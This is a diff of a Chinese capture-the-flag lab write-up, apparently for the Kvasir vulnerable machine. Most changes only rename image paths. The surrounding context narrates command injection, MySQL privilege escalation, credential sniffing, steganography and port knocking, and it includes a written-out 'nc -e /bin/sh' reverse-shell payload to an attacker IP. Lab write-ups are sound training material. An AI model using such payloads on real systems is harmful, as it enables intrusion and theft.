@@ -9,88 +9,88 @@
 
 查找靶机IP
 
-![](../../.gitbook/assets/1571065409_5da48e4153c30-1675839781445648.png)
+![](../../.gitbook/assets/1571065409_5da48e4153c30.png)
 
 
 扫描靶机开放端口
 
-![](../../.gitbook/assets/1571065504_5da48ea0f079b-1675839781445649.png)
+![](../../.gitbook/assets/1571065504_5da48ea0f079b.png)
 
 这个靶机只开放了80端口，浏览器打开80端口
 
-![](../../.gitbook/assets/1571065548_5da48ecc4c27c-1675839781445650.png)
+![](../../.gitbook/assets/1571065548_5da48ecc4c27c.png)
 
 遇见输入框第一次时间就要看有没有SQL注入
 
-![](../../.gitbook/assets/1571134892_5da59dac0d661-1675839781445651.png)
+![](../../.gitbook/assets/1571134892_5da59dac0d661.png)
 
 
 
-![](../../.gitbook/assets/1571134904_5da59db8408d9-1675839781445652.png)
+![](../../.gitbook/assets/1571134904_5da59db8408d9.png)
 
 看到上面这个回显，sqlmap跑起，发现403错误
 
-![](../../.gitbook/assets/1571134948_5da59de4d4893-1675839781445653.png)
+![](../../.gitbook/assets/1571134948_5da59de4d4893.png)
 
 
 
-![](../../.gitbook/assets/1571134981_5da59e05a334c-1675839781445654.png)
+![](../../.gitbook/assets/1571134981_5da59e05a334c.png)
 
 还有一个页面，注册一个账号
 
-![](../../.gitbook/assets/1571135097_5da59e791aa57-1675839781445655.png)
+![](../../.gitbook/assets/1571135097_5da59e791aa57.png)
 
 发现没有什么东西
 
-![](../../.gitbook/assets/1571135193_5da59ed9801d1-1675839781445656.png)
+![](../../.gitbook/assets/1571135193_5da59ed9801d1.png)
 
 现在没有线索可以搞，扫描一下目录，找到login.php，不过测试302跳转了
 
-![](../../.gitbook/assets/1571136557_5da5a42db452d-1675839781445658.png)
+![](../../.gitbook/assets/1571136557_5da5a42db452d.png)
 
 使用bp显示数据包的response
 
-![](../../.gitbook/assets/1571136616_5da5a4687ab82-1675839781445657.png)
+![](../../.gitbook/assets/1571136616_5da5a4687ab82.png)
 
 
 
-![](../../.gitbook/assets/1571136678_5da5a4a6f117f-1675839781445659.png)
+![](../../.gitbook/assets/1571136678_5da5a4a6f117f.png)
 
 修改状态码为200
 
-![](../../.gitbook/assets/1571136708_5da5a4c473857-1675839781445660.png)
+![](../../.gitbook/assets/1571136708_5da5a4c473857.png)
 
 
 页面显示出来了  
 
-![](../../.gitbook/assets/1571136718_5da5a4cec5178-1675839781445661.png)
+![](../../.gitbook/assets/1571136718_5da5a4cec5178.png)
 
 
 
-![](../../.gitbook/assets/1571137005_5da5a5edccc8d-1675839781445662.png)
+![](../../.gitbook/assets/1571137005_5da5a5edccc8d.png)
 
 修改状态码为200
 
-![](../../.gitbook/assets/1571137065_5da5a629ec21d-1675839781445663.png)
+![](../../.gitbook/assets/1571137065_5da5a629ec21d.png)
 
 
 
-![](../../.gitbook/assets/1571137092_5da5a6443d741-1675839781445664.png)
+![](../../.gitbook/assets/1571137092_5da5a6443d741.png)
 
 这个输入框存在命令注入漏洞
 
-![](../../.gitbook/assets/1571137226_5da5a6ca3e5e5-1675839781445665.png)
+![](../../.gitbook/assets/1571137226_5da5a6ca3e5e5.png)
 
 
 
-![](../../.gitbook/assets/1571137239_5da5a6d7e17d0-1675839781445666.png)
+![](../../.gitbook/assets/1571137239_5da5a6d7e17d0.png)
 
 nc反弹
 
           apache2; nc -e /bin/sh 192.168.0.106 4444 #
 
 
-![](../../.gitbook/assets/1571137468_5da5a7bc7f0a2-1675839781445667.png)
+![](../../.gitbook/assets/1571137468_5da5a7bc7f0a2.png)
 
 
 查看页面的源代码
@@ -135,7 +135,7 @@ nc反弹
 
 看来有两张网卡
 
-![](../../.gitbook/assets/1571137963_5da5a9ab0d071-1675839781445668.png)
+![](../../.gitbook/assets/1571137963_5da5a9ab0d071.png)
 
 使用数据库进行操作
 
@@ -167,7 +167,7 @@ nc反弹
 
   接下来破解一下mysql密码,coolwater
 
-![](../../.gitbook/assets/1571138697_5da5ac898dd46-1675839781446669.png)
+![](../../.gitbook/assets/1571138697_5da5ac898dd46.png)
 
 来到这一步，发现这个命令执行漏洞的nc反弹好麻烦，于是我使用kali自带的反弹shell
 
@@ -191,12 +191,13 @@ nc反弹
 
 
 
-![](../../.gitbook/assets/1571400685_5da9abed701b7-1675839781446670.png)
+
+![](../../.gitbook/assets/1571400685_5da9abed701b7.png)
 
 
 使用msf进行反弹连接  
 
-![](../../.gitbook/assets/1571400938_5da9acea2f422-1675839781446671.png)
+![](../../.gitbook/assets/1571400938_5da9acea2f422.png)
 
 设置端口转发，本地连接数据库
 
@@ -205,15 +206,15 @@ nc反弹
 
   现在就可以连接上数据库了
 
-![](../../.gitbook/assets/1571406335_5da9c1ff61816-1675839781446672.png)
+![](../../.gitbook/assets/1571406335_5da9c1ff61816.png)
 
 查看文件
 
-![](../../.gitbook/assets/1571406395_5da9c23b040b0-1675839781446673.png)
+![](../../.gitbook/assets/1571406395_5da9c23b040b0.png)
 
 看来权限不够
 
-![](../../.gitbook/assets/1571406417_5da9c251d86cf-1675839781446674.png)
+![](../../.gitbook/assets/1571406417_5da9c251d86cf.png)
 
 如果您有一个`mysql`以`root`用户身份运行的目标，并且对目标`mysql`实例具有足够的特权，则可以通过编译和加载恶意库来提升命令执行的效率。
 
@@ -279,27 +280,27 @@ exp
 
 
 
-![](../../.gitbook/assets/1571410084_5da9d0a4ef264-1675839781446676.png)
+![](../../.gitbook/assets/1571410084_5da9d0a4ef264.png)
 
 现在我们端口转发22端口出来
 
-![](../../.gitbook/assets/1571410207_5da9d11f4a8e7-1675839781446675.png)
+![](../../.gitbook/assets/1571410207_5da9d11f4a8e7.png)
 
 重置root登录密码
 
-![](../../.gitbook/assets/1571410270_5da9d15e049c4-1675839781446677.png)
+![](../../.gitbook/assets/1571410270_5da9d15e049c4.png)
 
 好，已经登录成功了
 
-![](../../.gitbook/assets/1571410326_5da9d196b7612-1675839781446678.png)
+![](../../.gitbook/assets/1571410326_5da9d196b7612.png)
 
 找到了一个flag，看来不是这个
 
-![](../../.gitbook/assets/1571410509_5da9d24d31e65-1675839781446679.png)
+![](../../.gitbook/assets/1571410509_5da9d24d31e65.png)
 
 查看本地开放的端口，就是pure-ftp有可疑，毕竟只有21端口咱们没有使用到
 
-![](../../.gitbook/assets/1571410626_5da9d2c20d3d4-1675839781446680.png)
+![](../../.gitbook/assets/1571410626_5da9d2c20d3d4.png)
 
 找到了FTP的密码
 
@@ -308,39 +309,39 @@ exp
 
   咱们根目录有一个叫.words.txt文件，可能是密码表，使用john进行爆破，还是找不到密码
 
-![](../../.gitbook/assets/1571411024_5da9d4507cdd0-1675839781446681.png)
+![](../../.gitbook/assets/1571411024_5da9d4507cdd0.png)
 
 **其实有个问题很奇怪的，正常来说，一个靶机就只有一张网卡，但是这个靶机就不同，有两张网卡，而且是不同的网段**
 
-![](../../.gitbook/assets/1571411134_5da9d4be152f6-1675839781446682.png)
+![](../../.gitbook/assets/1571411134_5da9d4be152f6.png)
 
 
 于是，我抓一下eth1网卡的流量，看到有人登录ftp
 
-![](../../.gitbook/assets/1571411324_5da9d57c74b61-1675839781446683.png)
+![](../../.gitbook/assets/1571411324_5da9d57c74b61.png)
 
 以十六进制的方式查看，找到了ftp账号和密码，他们使用的用户名`celes`和密码登录`im22BF4HXn01`
 
-![](../../.gitbook/assets/1571411463_5da9d6071d866-1675839781446684.png)
+![](../../.gitbook/assets/1571411463_5da9d6071d866.png)
 
 ssh登录上去
 
-![](../../.gitbook/assets/1571411523_5da9d64352975-1675839781446685.png)
+![](../../.gitbook/assets/1571411523_5da9d64352975.png)
 
 可以看到这是ftp连接脚本
 
-![](../../.gitbook/assets/1571411645_5da9d6bd09860-1675839781446686.png)
+![](../../.gitbook/assets/1571411645_5da9d6bd09860.png)
 
 在操作历史记录里面找到一个可疑操作，这是一个python图片隐写术的库
 
     celes@dev1:~$ cat .bash_history 
     stepic --help
 
-![](../../.gitbook/assets/1571411773_5da9d73d86d75-1675839781446687.png)
+![](../../.gitbook/assets/1571411773_5da9d73d86d75.png)
 
 也就是说，图片是关键，我们找到图片kvasir.png，使用xxd导出图片
 
-![](../../.gitbook/assets/1571452853_5daa77b5abeea-1675839781446688.png)
+![](../../.gitbook/assets/1571452853_5daa77b5abeea.png)
 
 还原图片
 
@@ -350,7 +351,7 @@ ssh登录上去
 
   
 
-![](../../.gitbook/assets/1571453067_5daa788b3977c-1675839781446689.png)
+![](../../.gitbook/assets/1571453067_5daa788b3977c.png)
 
 使用`stepic`，我们可以从图像中检索一些隐藏的数据`k.png`。 **(pip3 install stepic，pip不可以)，**
 这样就找到了一串十六进制的字符串
@@ -369,22 +370,22 @@ root@kali:/tmp# stepic -i k.jpg -d
 
 
 
-![](../../.gitbook/assets/1571453402_5daa79da42802-1675839781446690.png)
+![](../../.gitbook/assets/1571453402_5daa79da42802.png)
 
 解析二维码的内容，
 
  **Nk9yY31hva8q**
 
-![](../../.gitbook/assets/1571453440_5daa7a00d6bc2-1675839781446691.png)
+![](../../.gitbook/assets/1571453440_5daa7a00d6bc2.png)
 
 
 登录时`celes`，我们收到邮件通知，我们去查看一下有什么邮件
 
-![](../../.gitbook/assets/1571453562_5daa7a7a71de5-1675839781446692.png)
+![](../../.gitbook/assets/1571453562_5daa7a7a71de5.png)
 
 在db主机那里找了terra的服务器，IP是192.168.3.50
 
-![](../../.gitbook/assets/1571453764_5daa7b44cd9f0-1675839781446693.png)
+![](../../.gitbook/assets/1571453764_5daa7b44cd9f0.png)
 
 找了个扫描器的脚本，查看这台服务器开放了那个端口
 
@@ -410,15 +411,15 @@ root@kali:/tmp# stepic -i k.jpg -d
 
   
 
-![](../../.gitbook/assets/1571454076_5daa7c7c03564-1675839781446694.png)
+![](../../.gitbook/assets/1571454076_5daa7c7c03564.png)
 
 使用上面的密码登录ssh，发现密码错误
 
-![](../../.gitbook/assets/1571454125_5daa7cad268f1-1675839781446695.png)
+![](../../.gitbook/assets/1571454125_5daa7cad268f1.png)
 
 nc查看一下4444端口
 
-![](../../.gitbook/assets/1571454252_5daa7d2cb8eca-1675839781446696.png)
+![](../../.gitbook/assets/1571454252_5daa7d2cb8eca.png)
 
 
 
@@ -529,7 +530,7 @@ EXP脚本
 
 上面这段是base64加密，我们解密一下，对此进行解码会得到一个`rsa`私钥。
 
-![](../../.gitbook/assets/1571454517_5daa7e35ac98b-1675839781446697.png)
+![](../../.gitbook/assets/1571454517_5daa7e35ac98b.png)
 
 
     -----BEGIN RSA PRIVATE KEY-----
@@ -566,31 +567,31 @@ EXP脚本
   我将密钥放入文件中并保存`chmod`到`600`。然后我尝试用它来`ssh`作为`terra`来`192.168.3.50`。系统提示您输入密钥的密码，因为它已加密，因此我使用了之前找到的字符串-
   `Nk9yY31hva8q`。
 
-![](../../.gitbook/assets/1571454609_5daa7e9113ed2-1675839781447698.png)
+![](../../.gitbook/assets/1571454609_5daa7e9113ed2.png)
 
 查看一下目录，我们找到开放4444端口的脚本
 
-![](../../.gitbook/assets/1571454704_5daa7ef0c7129-1675839781447699.png)
+![](../../.gitbook/assets/1571454704_5daa7ef0c7129.png)
 
 登录后，我们收到了一封邮件通知。让我们看看那封邮件是什么。
 
-![](../../.gitbook/assets/1571454740_5daa7f1401cb9-1675839781447700.png)
+![](../../.gitbook/assets/1571454740_5daa7f1401cb9.png)
 
 按照邮件提示Locke存在端口敲门服务,IP是192.168.4.100，既然没有提示我们要敲击那个端口，我查了一下资料，原来有默认端口
 
-![](../../.gitbook/assets/1594125824-1675839781447701.jpeg)
+![](../../.gitbook/assets/1594125824.jpeg)
 
 开启了1111端口
 
-![](../../.gitbook/assets/1571455200_5daa80e00e959-1675839781447702.png)
+![](../../.gitbook/assets/1571455200_5daa80e00e959.png)
 
 原来这个1111端口就是一个shell
 
-![](../../.gitbook/assets/1571455235_5daa810303d7a-1675839781447703.png)
+![](../../.gitbook/assets/1571455235_5daa810303d7a.png)
 
 按照提示image是个关键
 
-![](../../.gitbook/assets/1571455388_5daa819c2189d-1675839781447704.png)
+![](../../.gitbook/assets/1571455388_5daa819c2189d.png)
 
 使用证书登录shell
 
@@ -600,19 +601,19 @@ EXP脚本
 
   登录成功后，将这个文件提取出来
 
-![](../../.gitbook/assets/1571455799_5daa83372e70f-1675839781447705.png)
+![](../../.gitbook/assets/1571455799_5daa83372e70f.png)
 
 提取到本地kali，解压打开
 
-![](../../.gitbook/assets/1571456134_5daa84864df8c-1675839781447706.png)
+![](../../.gitbook/assets/1571456134_5daa84864df8c.png)
 
 它是一个磁盘，里面有个压缩包，解压不了，需要密码
 
-![](../../.gitbook/assets/1571458669_5daa8e6ddc516-1675839781447707.png)
+![](../../.gitbook/assets/1571458669_5daa8e6ddc516.png)
 
 我们爆破不了密码
 
-![](../../.gitbook/assets/1571458918_5daa8f668ca38-1675839781447708.png)
+![](../../.gitbook/assets/1571458918_5daa8f668ca38.png)
 
 dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换
 
@@ -623,44 +624,44 @@ dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定
 
   下载到本地之后，发现没有wav这个音频，可能xxd下来有些问题，只能靶机生成wav再用xxd下载到本地
 
-![](../../.gitbook/assets/1571460337_5daa94f1e4d2b-1675839781447709.png)
+![](../../.gitbook/assets/1571460337_5daa94f1e4d2b.png)
 
 声音超级难听=-=
 
-![](../../.gitbook/assets/1571460750_5daa968e3d511-1675839781447710.png)
+![](../../.gitbook/assets/1571460750_5daa968e3d511.png)
 
 
 使用audacity查看音频，发现有一串字符串，OrcWQi5VhfCo
 
-![](../../.gitbook/assets/1571461315_5daa98c34951a-1675839781447711.png)
+![](../../.gitbook/assets/1571461315_5daa98c34951a.png)
 
 使用这个密码解压压缩包，得到了一个密码
 
-![](../../.gitbook/assets/1571461652_5daa9a1470ec7-1675839781447712.png)
+![](../../.gitbook/assets/1571461652_5daa9a1470ec7.png)
 
 切换到kefka用户
 
-![](../../.gitbook/assets/1571461939_5daa9b3345d93-1675839781447714.png)
+![](../../.gitbook/assets/1571461939_5daa9b3345d93.png)
 
 我们看看该用户有没有特权命令
 
-![](../../.gitbook/assets/1571462012_5daa9b7c0adeb-1675839781447713.png)
+![](../../.gitbook/assets/1571462012_5daa9b7c0adeb.png)
 
 让我们来运行一下，没有什么回应
 
-![](../../.gitbook/assets/1571462056_5daa9ba84af00-1675839781447715.png)
+![](../../.gitbook/assets/1571462056_5daa9ba84af00.png)
 
 退出的时候，发现这个脚本用sock接受东西
 
-![](../../.gitbook/assets/1571462104_5daa9bd8ee016-1675839781447716.png)
+![](../../.gitbook/assets/1571462104_5daa9bd8ee016.png)
 
 我们监听一下端口，可以看出程序已经开放了1234端口
 
-![](../../.gitbook/assets/1571462174_5daa9c1eb0538-1675839781447717.png)
+![](../../.gitbook/assets/1571462174_5daa9c1eb0538.png)
 
 nc连接到1234端口
 
-![](../../.gitbook/assets/1571472739_5daac5632a29c-1675839781447718.png)
+![](../../.gitbook/assets/1571472739_5daac5632a29c.png)
 
 
 很快我们可以观察到以下几点：
@@ -782,7 +783,7 @@ sock.close()
 
 进去之后就是一个python客户端
 
-![](../../.gitbook/assets/1571473865_5daac9c92a845-1675839781447719.png)
+![](../../.gitbook/assets/1571473865_5daac9c92a845.png)
 
 wep2.py
 
@@ -884,11 +885,11 @@ wep2.py
 
   找到了flag，不过字符串倒转了
 
-![](../../.gitbook/assets/1571473974_5daaca36ab465-1675839781447720.png)
+![](../../.gitbook/assets/1571473974_5daaca36ab465.png)
 
 最后flag
 
-![](../../.gitbook/assets/1571474008_5daaca5880dfd-1675839781447721.png)
+![](../../.gitbook/assets/1571474008_5daaca5880dfd.png)
 
 
 
